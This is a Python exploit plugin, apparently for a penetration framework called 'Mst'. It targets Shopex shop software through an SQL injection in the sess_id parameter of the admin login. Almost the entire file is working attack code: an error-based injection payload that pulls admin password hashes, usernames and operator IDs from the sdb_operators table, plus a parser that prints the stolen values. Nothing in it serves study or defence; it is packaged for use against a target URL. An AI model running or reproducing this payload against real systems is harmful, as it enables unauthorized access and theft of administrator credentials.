
# -*- coding: cp936 -*-
'''
Mst=>exploit=>plugin
Shopex=>sessid=>SqlInject
'''
class mstplugin:
    '''Shopex sqlinject'''
    infos = [
        ['插件','Shopex sessid SqlInject Exp'],
        ['作者','teamtopkarl'],
        ['更新','2013/10/24'],
        ['网址','http://www.21hn.net']
        ]
    opts  = [
        ['RURL','www.xxxxxxx.com','目标URL'],
        ['RPATH','/shopadmin/','CMS路径'],
        ['RPORT','80','目标端口'],
        ['PAYLOAD','false',"不需要后攻击插件"]
        ]
    def exploit(self):
        '''start exploit'''
        if RPORT == '443':
            url = 'https://%s%s'%(RURL,RPATH)
        else:
            url = 'http://%s:%s%s'%(RURL,RPORT,RPATH)
        exp = url+"index.php?ctl=passport&act=login&sess_id=1'+and(select+1+from(select+count(*),concat((select+(select+(select+concat(userpass,0x7e,username,0x7e,op_id)+from+sdb_operators+Order+by+username+limit+0,1)+)+from+`information_schema`.tables+limit+0,1),floor(rand(0)*2))x+from+`information_schema`.tables+group+by+x)a)+and+'1'='1"
        color.cprint("[*] Sending exp..",YELLOW)
        ok  = fuck.urlget(exp)
        if ok.getcode() == 200:
            tmp=fuck.find(r"(Duplicate entry ')(.{32})~(.*)~(\d*)(' for key 'group_key')",ok.read())
            if len(tmp)>0:
                color.cprint("[*] Exploit Successful !",GREEN)
                i=1
                for res in tmp:
                    res=res[1:len(res)-1]
                    color.cprint("[%s] %s"%(i,res),GREEN)
                    i+=1
            else:
                color.cprint("[!] TARGET NO VULNERABLE !",RED)
        else:
            color.cprint("[!] EXPLOIT FALSE ! CODE:%s"%ok.getcode(),RED)
